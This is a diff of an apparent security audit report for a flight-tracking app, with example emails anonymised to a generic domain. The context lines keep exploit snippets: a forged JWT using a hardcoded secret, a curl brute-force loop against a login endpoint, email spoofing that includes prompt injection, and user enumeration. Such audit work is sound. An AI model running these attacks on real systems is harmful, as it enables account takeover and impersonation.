@@ -175,7 +175,7 @@ Example exploit:
 ```javascript
 const jwt = require('jsonwebtoken');
 const token = jwt.sign(
-  { id: 1, email: 'admin@pgtek.com', name: 'Admin' },
+  { id: 1, email: 'admin@company.com', name: 'Admin' },
   'gatebump-jwt-secret-change-in-production-2026',
   { expiresIn: '7d' }
 );
@@ -276,7 +276,7 @@ No rate limiting on login, registration, or API endpoints. Attackers can:
 for i in {1..10000}; do
   curl -X POST http://100.97.65.28:3111/api/auth/login \
     -H "Content-Type: application/json" \
-    -d '{"email":"admin@pgtek.com","password":"pass'$i'"}'
+    -d '{"email":"admin@company.com","password":"pass'$i'"}'
 done
 ```
 
@@ -339,13 +339,13 @@ let user = db.prepare('SELECT id, email FROM users WHERE LOWER(email) = ?').get(
 **Exploit:**  
 Attacker sends an email to `gatemate@yourdomain.com` with:
 ```
-From: victim@pgtek.com
+From: victim@company.com
 Subject: My flights
 Body: [malicious flight data or prompt injection]
 ```
 
 The system will:
-1. Accept the email as coming from `victim@pgtek.com`
+1. Accept the email as coming from `victim@company.com`
 2. Create pending trips in victim's account
 3. Victim accepts them unknowingly
 
@@ -525,7 +525,7 @@ router.post('/emails', authenticate, (req, res) => {
 ```
 
 **Exploit:**  
-1. Attacker registers with `attacker@pgtek.com` (allowed domain)
+1. Attacker registers with `attacker@company.com` (allowed domain)
 2. Adds secondary email `attacker@malicious.com`
 3. Sends spoofed emails from `attacker@malicious.com` to GateMate inbox
 4. Email poller accepts them (checks `user_emails` table)
@@ -707,7 +707,7 @@ This **leaks** whether an email is registered (attacker can enumerate users).
 ```bash
 curl -X POST http://100.97.65.28:3111/api/auth/register \
   -H "Content-Type: application/json" \
-  -d '{"email":"ceo@pgtek.com","password":"test123","name":"Test"}'
+  -d '{"email":"ceo@company.com","password":"test123","name":"Test"}'
 
 # Response:
 # {"error":"Email already registered"} ← user exists
